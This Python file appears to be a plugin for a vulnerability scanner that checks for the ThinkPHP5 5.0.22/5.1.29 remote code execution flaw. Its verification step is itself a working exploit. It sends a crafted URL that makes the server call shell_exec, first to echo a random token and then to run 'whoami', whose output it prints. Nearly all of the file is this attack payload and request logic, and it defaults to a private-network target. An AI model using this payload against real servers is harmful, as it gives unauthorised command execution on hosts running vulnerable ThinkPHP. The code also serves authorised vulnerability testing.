#!/usr/bin/env python3

'''
name: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
description: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
'''

import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Thinkphp5_5_0_22_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.capta = get_capta()
        self.check_payload =  '''/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=%s''' %(urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8'))
        self.cmd_payload =  '''/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami'''

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            self.check_url = self.url + self.check_payload
            check_req = request.get(self.check_url, headers = self.headers)
            if check_req.status_code == 200 and self.capta in check_req.text:
                self.cmd_url = self.url + self.cmd_payload
                cmd_req = request.get(self.cmd_url, headers = self.headers)
                print ('存在ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞,执行whoami命令成功，执行结果是:', cmd_req.text.replace('\n', ''))
                return True
            else:
                print('不存在ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞')
                return False
        except Exception as e:
            print (e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    Thinkphp5_5_0_22 = Thinkphp5_5_0_22_BaseVerify('http://192.168.33.162/yzncms_v1.0/YZNCMS/public')
    Thinkphp5_5_0_22.run()